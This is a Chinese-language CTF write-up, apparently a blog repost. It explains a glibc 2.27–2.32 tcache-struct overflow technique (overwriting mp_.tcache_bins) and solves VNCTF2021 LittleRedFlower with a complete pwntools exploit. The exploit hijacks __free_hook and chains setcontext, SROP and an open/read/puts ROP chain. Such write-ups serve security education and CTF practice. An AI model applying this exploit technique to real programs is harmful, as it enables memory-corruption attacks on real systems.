> 原文链接: https://www.anquanke.com//post/id/235821 


# glibc 2.27-2.32版本下Tcache Struct的溢出利用


                                阅读量   
                                **387786**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01ee3fe6fd26e75b2c.jpg)](https://p2.ssl.qhimg.com/t01ee3fe6fd26e75b2c.jpg)



## 简介

在高版本的glibc中安全机制也比较完善，就算我们找到漏洞，构造出堆块重叠，也常常难以得到任意读写的方法。在VNCTF2021的比赛中LittleReadFlower这道题目引入了一种**全新的漏洞利用方式**，通过修改tcache数量限制，使得tcache结构溢出到后部可控区域，来达到**任意读写**的目的。



## 适用范围：

1.libc版本为2.27及以上版本（有tcache）

2.只能申请较大size，size大小超过了tcache max size（0x408）（能够申请小size也能适用于这个方法，但没有必要使用这个方法）

3.UAF，有off by one ，off by null等漏洞都可以构造出UAF，然后利用UAF来写入一个大数字（如果是旧版本可以考虑使用unsorted bin attack，如果是新版本的libc可以考虑使用largebin attack）

4.有edit功能，或者在add过程中允许对堆块写入内容。



## 利用目的：

在size申请要大于0x408的程序中，我们可以通过这个方法，利用tcache的便利性（检测少）来达到任意读写来进一步利用。



## 思路详解：

### <a class="reference-link" name="%E6%83%B3%E6%B3%95%E8%B5%B7%E6%BA%90"></a>想法起源

是否存在一种方法来修改tcache的最大数量，使得tcache的范围超过0x408字节，通过类似于global_max_fast的溢出方式，来使得tcache struct溢出到我们申请的可控堆空间，然后通过修改可控堆空间来申请到我们想要的位置。

我通过两部分来讲解如何让**tcache struct溢出并且伪造tcache struct的内容**，操作完这两步后，接下来的申请就可以申请出我们想要的内存空间。

### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9Tcache%E7%9A%84%E6%9C%80%E5%A4%A7%E6%95%B0%E9%87%8F%EF%BC%9F"></a>如何修改Tcache的最大数量？

搜索代码中的TCACHE_MAX_BINS，发现这是一个宏定义的常量。

[![](https://p5.ssl.qhimg.com/t013e1b1183d12eaf7d.png)](https://p5.ssl.qhimg.com/t013e1b1183d12eaf7d.png)

这意味着我们无法在程序运行的时候动态修改，因为宏定义的常量在编译期间替换，于是我们要寻找相关的也同样是记录这这个内容的数据

但是我发现在malloc的时候，代码中把**tc_idx**与**TCACHE_MAX_BINS**的比对给替换了，从而用**mp_.tcache_bins**来代替

[![](https://p2.ssl.qhimg.com/t0178d634210849a624.png)](https://p2.ssl.qhimg.com/t0178d634210849a624.png)

而**mp_.tcache_bins**的内容属于我们可写的数据区域，我们可以通过largebin attack或者unsorted bin attack往里面写一个较大的数字。这样在比对的时，我们超出**TCACHE_MAX_BINS**限制的堆块也可以tcache来申请出来。

解决了这个条件判定后，我们需要来考虑**tcache_get**内的限制

[![](https://p2.ssl.qhimg.com/t01a3aad9843cb729d4.png)](https://p2.ssl.qhimg.com/t01a3aad9843cb729d4.png)

这里用**assert**对idx和**TCACHE_MAX_BINS**进行比对，我在本地测试的时候用的是2.29的libc，在这块地方发生了报错，但实际在题目给出的libc中一般**assert**的内容都会被优化掉，所以这个检测语句也不复存在了。

### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E4%BC%AA%E9%80%A0Tcache%20struct%E5%86%85%E5%AE%B9%EF%BC%9F"></a>如何伪造Tcache struct内容？

要知道如何伪造**Tcache struct**的内容，就首先要知道tcache的结构是怎么样的，这里我区分为glibc2.30以下版本和以上版本来说明。

**<a class="reference-link" name="glibc2.30%E4%BB%A5%E4%B8%8B%E7%89%88%E6%9C%AC"></a>glibc2.30以下版本**

[![](https://p1.ssl.qhimg.com/t010276d9513b95f85d.png)](https://p1.ssl.qhimg.com/t010276d9513b95f85d.png)

tcache struct的内容是有一个char类型的counts数组和entries链表。

其中counts数组实际上是用于记录当前这个size中储存的tcache链表长度，而从使用类型也可以看出来，使用char类型导致实际上最大的长度（**MAX_TCACHE_COUNT**）值是127。

在这部分的版本中，glibc在从tcache struct取出内容的时候不会检查counts的大小，从而我们只需要**修改我们想要申请的size对应的链表头部位置**即可申请到。

不过需要注意，在申请出来的时候会让counts对应的内容-1，需要注意不要让这部分内容修改到重要的数据（比如堆块的结构体信息等等…）

**<a class="reference-link" name="glibc2.30%E5%8F%8A%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC"></a>glibc2.30及以上版本**

相信有的师傅在调试的过程中也能够发现，glibc2.30及以上的版本，tcache struct的大小有所变化，而这个变化就是由于counts的类型改变所致的。

[![](https://p3.ssl.qhimg.com/t015e9b639ad9eb97e1.png)](https://p3.ssl.qhimg.com/t015e9b639ad9eb97e1.png)

在新版本中counts的类型是**uint16_t**，占用2个字节，而之前版本只有1个字节。这样修改的目的我认为应该是为了在一些特殊环境中可能会需要使用tcache来管理堆块，而之前的最大限制127已经无法满足这样的要求，故增大数据类型。

在这些版本中，当从tcache中取出数据的时候会检测counts是否大于0，这使得我们如果要伪造tcache结构的话，同时需要考虑如何**修改counts的值大于0**。

不过counts的2字节却要比1字节更容易修改一些，因为这样可以用更小的size溢出到我们的可控区域。

在这之上我们再修改**想要申请的size对应的链表头部位置**即可

**<a class="reference-link" name="Tips"></a>Tips**

因为溢出和tcache struct内容存放在堆空间上的缘故，需要伪造的结构内容会落在我们的可控堆块上，所以**题目只需要有edit功能，或者在add过程中允许对堆块写入内容皆可完成这一步**。



## 题目实例

单纯的从利用手法触发，可能不够形象，接下来用题目来详细的解释，也方便各位师傅练手。

题目会侧重于讲解tcache struct溢出的部分。

### <a class="reference-link" name="VNCTF2021%20LittleRedFlower"></a>VNCTF2021 LittleRedFlower

**<a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息**

[![](https://p0.ssl.qhimg.com/t01b518c458c69b886f.png)](https://p0.ssl.qhimg.com/t01b518c458c69b886f.png)

**<a class="reference-link" name="%E4%BF%A1%E6%81%AF%E6%95%B4%E7%90%86"></a>信息整理**

1.libc2.30(给出了libc_base)<br>
2.任意写一字节<br>
3.堆空间附近任意写八字节<br>
4.申请一个大小在0xFFF到0x2000之间的堆块<br>
5.在申请到的堆空间上写数据<br>
6.禁用了execve

[![](https://p3.ssl.qhimg.com/t01e4b6e872931055bd.png)](https://p3.ssl.qhimg.com/t01e4b6e872931055bd.png)

**<a class="reference-link" name="%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"></a>解题思路**

1.【修改tcache的最大数量】通过1字节的修改来修改**mp_.tcache_bins**

2.【伪造tcache struct内容】通过在堆附近写8字节空间来在对应位置写入**__free_hook的位置**

3.申请出**__free_hook**，并修改为我们的gadget

4.orw

<a class="reference-link" name="%E4%BF%AE%E6%94%B9tcache%E7%9A%84%E6%9C%80%E5%A4%A7%E6%95%B0%E9%87%8F"></a>**修改tcache的最大数量**

在有源码调试的情况下，我们可以很轻松的定位到**mp_.tcache_bins**的位置。以下是我用libc2.29的源码调试

[![](https://p1.ssl.qhimg.com/t01f88625350da8bb0c.png)](https://p1.ssl.qhimg.com/t01f88625350da8bb0c.png)

但在没有源码的情况下，我们用题目所给的libc，定位到这个位置是比较困难的，我根据一些直觉找到了这个位置，并且计算出偏移。

[![](https://p3.ssl.qhimg.com/t0127974833bc366e0c.png)](https://p3.ssl.qhimg.com/t0127974833bc366e0c.png)

需要注意的是，代码中的rip，是当前行汇编的下一行的内容。

那我是如何找到这个位置的呢？通过比对可以发现当我们输入的申请size为4096的时候，计算出来的idx=0xFF，而这个位置都是某个数据与0xFF进行比对，并且用的是jb，所以我推测这个位置就是**mp_.tcache_bins**，其次就是看到该位置的数据内容是0x40=64，正好是tcahce的默认个数。

接着我们计算出偏移，再+7（修改最高位）就可以用于exp中了。

**<a class="reference-link" name="%E4%BC%AA%E9%80%A0Tcache%20struct"></a>伪造Tcache struct**

从上面的信息我们可以知道在libc2.30中会校验counts是否大于0，如果是0则不从Tcache中取，所以我们需要在调试过程中，找到一个合适的size，使得判定counts的位置正好落在了程序申请的0x200的堆块上，因为这个堆块用memset初始化之后每个字节的内容都是1。

[![](https://p1.ssl.qhimg.com/t010c795d0b2b1199ca.png)](https://p1.ssl.qhimg.com/t010c795d0b2b1199ca.png)

接着我们需要通过调试定位到**tcahce-&gt;entries[tc_idx]**的位置，并且利用八字节修改来使得这个位置变成我们想要申请到的位置，这里显然是申请到**__free_hook**比较合适。

[![](https://p4.ssl.qhimg.com/t01a4d27b9aa4abfde2.png)](https://p4.ssl.qhimg.com/t01a4d27b9aa4abfde2.png)

**<a class="reference-link" name="%E4%BF%AE%E6%94%B9__free_hook%E6%9D%A5%E6%89%A7%E8%A1%8CSROP"></a>修改__free_hook来执行SROP**

我们知道这道题需要orw，那么我们就要考虑如何把堆上的漏洞来转换到栈上，首先可以想到的是利用**setcontext**来操作。

在libc2.29及以后的版本，**setcontext + 61**中调用的参数变成了rdx，而不是rdi，这使得我们在利用__free_hook传参的时候，无法直接传到setcontext中，这里我们就要考虑找一个gadget来传参使得rdi的参数转变到rdx上。

（由于setcontext开头的一些指令会导致奔溃，所以我们需要直接跳转到 + 61的位置来调用）

通过ropper来搜索

```
ropper-f"./libc-2.30.so"--search"mov rdx"
```

可以搜索到这个位置存在合理的gadget

```
#0x0000000000154b20: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
```

如果有师傅不知道这个操作的，可以仔细的研究一下这个gadget，我们只需要合理的构造即可使得rdi参数的信息转到rdx上，且调用**setcontext + 61**这个位置。

```
.text:0000000000055E00                 public setcontext ; weak
.text:0000000000055E00 setcontext      proc near               ; CODE XREF: .text:000000000005C16C↓p
.text:0000000000055E00                                         ; DATA XREF: LOAD:000000000000C6D8↑o
.text:0000000000055E00                 push    rdi
.text:0000000000055E01                 lea     rsi, [rdi+128h]
.text:0000000000055E08                 xor     edx, edx
.text:0000000000055E0A                 mov     edi, 2
.text:0000000000055E0F                 mov     r10d, 8
.text:0000000000055E15                 mov     eax, 0Eh
.text:0000000000055E1A                 syscall                 ; $!
.text:0000000000055E1C                 pop     rdx
.text:0000000000055E1D                 cmp     rax, 0FFFFFFFFFFFFF001h
.text:0000000000055E23                 jnb     short loc_55E80
.text:0000000000055E25                 mov     rcx, [rdx+0E0h]
.text:0000000000055E2C                 fldenv  byte ptr [rcx]
.text:0000000000055E2E                 ldmxcsr dword ptr [rdx+1C0h]
.text:0000000000055E35                 mov     rsp, [rdx+0A0h]
.text:0000000000055E3C                 mov     rbx, [rdx+80h]
.text:0000000000055E43                 mov     rbp, [rdx+78h]
.text:0000000000055E47                 mov     r12, [rdx+48h]
.text:0000000000055E4B                 mov     r13, [rdx+50h]
.text:0000000000055E4F                 mov     r14, [rdx+58h]
.text:0000000000055E53                 mov     r15, [rdx+60h]
.text:0000000000055E57                 mov     rcx, [rdx+0A8h]
.text:0000000000055E5E                 push    rcx
.text:0000000000055E5F                 mov     rsi, [rdx+70h]
.text:0000000000055E63                 mov     rdi, [rdx+68h]
.text:0000000000055E67                 mov     rcx, [rdx+98h]
.text:0000000000055E6E                 mov     r8, [rdx+28h]
.text:0000000000055E72                 mov     r9, [rdx+30h]
.text:0000000000055E76                 mov     rdx, [rdx+88h]
.text:0000000000055E7D                 xor     eax, eax
.text:0000000000055E7F                 retn
```

我们发现SROP中的frame信息，前0x28字节的信息基本上是没有用的，所以我们可以直接把前0x28字节的数据丢掉，并且补上一些配合gadget的数据。<br>
顺便一提，在执行orw的时候，我们其实可以直接利用libc中的函数来调用syscall，可以少找一条**syscall gadget**，说不定就差找这一条gadget的时间就拿到一血了呢？

### <a class="reference-link" name="EXP"></a>EXP

```
from pwn import *

r = process('./pwn')
#r = remote('node3.buuoj.cn', 28140)
context.log_level = "debug"
context.arch = "amd64"
# libc = ELF('/glibc/x64/2.29/lib/libc.so.6')
libc = ELF('./libc.so.6')
r.recvuntil('GIFT: ')
stdout_addr = int(r.recvuntil('\n')[:-1], 16)
print "stdout_addr: " + hex(stdout_addr)
libc.address = stdout_addr - libc.sym['_IO_2_1_stdout_']
print "libc_base: " + hex(libc.address)

r.sendafter('You can write a byte anywhere', p64(libc.address +   0x1ea2d0 + 0x7))
r.sendafter('And what?', '\xFF')
r.sendlineafter('Offset:', str(0x880))
r.sendafter('Content:', p64(libc.sym['__free_hook']))
#gdb.attach(r, 'b free')
r.sendafter('size:', str(0x1530))

pop_rdi_addr = libc.address + 0x0000000000026bb2
pop_rsi_addr = libc.address + 0x000000000002709c
pop_rdx_r12_addr = libc.address + 0x000000000011c3b1
fake_frame_addr = libc.sym['__free_hook'] + 0x10
frame = SigreturnFrame()

frame.rax = 0
frame.rdi = fake_frame_addr + 0xF8
frame.rsp = fake_frame_addr + 0xF8 + 0x10
frame.rip = libc.address + 0x00000000000256b9  # : ret
rop_data = [
    libc.sym['open'],
    pop_rdx_r12_addr,
    0x100,
    0x0,
    pop_rdi_addr,
    3,
    pop_rsi_addr,
    fake_frame_addr + 0x200,
    libc.sym['read'],
    pop_rdi_addr,
    fake_frame_addr + 0x200,
    libc.sym['puts']
]

gadget = libc.address + 0x0000000000154b20 #0x0000000000154b20: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
frame = str(frame).ljust(0xF8, '\x00')
payload = p64(gadget) + p64(fake_frame_addr) + '\x00' * 0x20 + p64(libc.sym['setcontext'] + 61) + \
          frame[0x28:] + "flag\x00\x00\x00\x00" + p64(0) + flat(rop_data)

r.sendafter('&gt;&gt;', payload)
r.interactive()
```
